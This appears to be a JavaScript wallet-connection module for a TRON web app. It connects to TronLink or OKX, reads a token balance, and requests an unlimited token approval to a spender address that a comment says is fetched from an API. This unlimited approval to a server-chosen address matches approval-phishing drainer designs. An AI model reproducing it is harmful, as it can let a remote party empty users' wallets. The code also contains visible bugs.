import { ethers } from 'ethers';
import { showNotify } from 'vant';
import { ABI, contractAddress } from './abi';
import { i18n } from '@/utils/i18n';
export async function connect() {
  return new Promise((res, rej) => {
    let tronWeb;

    if (window.tronLink.ready) {
      tronWeb = tronLink.tronWeb;
      return res(tronWeb);
    } else {
      tronLink.request({ method: 'tron_requestAccounts' }).then((tron) => {
        console.log(tron);
        if (tron.code == 200) {
          tronWeb = tronLink.tronWeb;
          return res(tronWeb);
        } else if (window.okxwallet && window.okxwallet) {
          if (window.okxwallet.tronWeb.defaultAddress.base58) {
            return res({
              address: window.okxwallet.tronWeb,
            });
          }
        } else {
          showNotify({ type: 'danger', message: i18n.global.t('msg.connectFail') });
          rej(false);
        }
      });
    }
  });
  // return new Promise((res, rej) => {
  //   if (window.tronLink && window.tronWeb.defaultAddress.base58) {
  //     console.log('tronlink钱包连接', window.tronWeb.defaultAddress.base58);
  //     return res({
  //       chain: 79,
  //       address: window.tronWeb.defaultAddress.base58,
  //     });
  //   } else if (window.okxwallet.tronWeb && window.okxwallet.tronWeb.defaultAddress.base58) {
  //     return res({
  //       chain: 79,
  //       address: window.okxwallet.tronWeb.defaultAddress.base58,
  //     });
  //     console.log('okx钱包连接', window.okxwallet.tronWeb.defaultAddress.base58);
  //   } else {
  //     rej(false);
  //   }
  // });
}

async function tokenBalance() {
  const contractAddress = contractAddress; //合约地址
  const contract = await tronWeb.contract(ABI, contractAddress);
  const decimals = await contract.decimals().call();
  const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
  console.log('余额', ethers.formatUnits(balance.toBigInt(), decimals));
}

export function tokenApprove(approve) {
  return new Promise(async (res, rej) => {
    // const contractAddress = contractAddress; //合约地址
    const adr = approve; //授权地址，从api获取
    const contract = await tronWeb.contract(ABI, contractAddress);
    // console.log(contract);
    contract
      .approve(adr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
      .send()
      .then((hash) => {
        let tt = setInterval(async function () {
          let info = await tronWeb.trx
            .getTransaction(hash)
            .then((info) => {
              if (info && info.ret && info.ret[0] && info.ret[0].contractRet == 'SUCCESS') {
                console.log(info.txID);
                clearInterval(tt);
                return res(info.txID);
              }
            })
            .catch((err) => {
              return rej(err);
            });
        }, 1000);
      })
      .catch((err) => {
        console.log(err);
        return rej(err);
      });
    // const hash = await contract.approve(adr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send().then();
    // console.log(hash);
    // let tt = setInterval(async function () {
    //   tronWeb.trx
    //     .getTransaction(hash)
    //     .then((info) => {
    //       if (info && info.ret && info.ret[0] && info.ret[0].contractRet == 'SUCCESS') {
    //         console.log(info.ret[0].contractRet);
    //         //调用api，把hash传入接口
    //         clearInterval(tt);
    //         return res(info.ret[0].contractRet);
    //       }
    //     })
    //     .catch((err) => {
    //       console.log('getTransaction', err);
    //       return rej(err);
    //     });
    // }, 1000);
  });
  // try {
  //   const contractAddress = contractAddress; //合约地址
  //   const adr = approve; //授权地址，从api获取
  //   const contract = await tronWeb.contract(ABI, contractAddress);
  //   const hash = await contract.approve(adr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send();
  //   console.log(hash);
  //   let tt = setInterval(async function () {
  //     let info = await tronWeb.trx.getTransaction(hash);
  //     console.log(info);
  //     if (info && info.ret && info.ret[0] && info.ret[0].contractRet == 'SUCCESS') {
  //       console.log(info.ret[0].contractRet);
  //       //调用api，把hash传入接口
  //       clearInterval(tt);
  //     }
  //   }, 1000);
  // } catch (e) {
  //   console.log(e);
  // }
}
